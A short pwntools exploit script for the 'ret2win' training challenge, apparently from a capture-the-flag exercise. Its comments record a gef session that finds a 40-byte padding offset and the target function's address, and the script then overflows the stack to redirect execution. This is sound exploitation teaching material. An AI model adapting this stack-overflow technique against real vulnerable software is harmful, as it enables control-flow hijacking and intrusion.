# coding: utf-8

# gef➤  pattern create 56
# [+] Generating a pattern of 56 bytes
# aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaa
# [+] Saved as '$_gef0'
# gef➤  run
# 
# <...>
# 
# > aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaa
# Thank you!
# 
# Program received signal SIGSEGV, Segmentation fault.
# 
# <...>
# 
# gef➤  pattern search $rsp
# [+] Searching '$rsp'
# [+] Found at offset 40 (little-endian search) likely
# [+] Found at offset 33 (big-endian search)
#
# [!] Padding is 40
# [*] $rip - $rsp also could've worked.
#
# gef➤ info functions
# <...>
# 0x0000000000400756  ret2win
# <...>
#
# [!] ret2win is at 0x0000000000400756.

from pwn import *
context(os="Linux", arch="amd64")

p = process("./ret2win")
p.recvuntil("> ")
p.sendline("\x41" * 40 + "\x56\x07\x40\x00\x00\x00\x00\x00")
print(p.recvall())
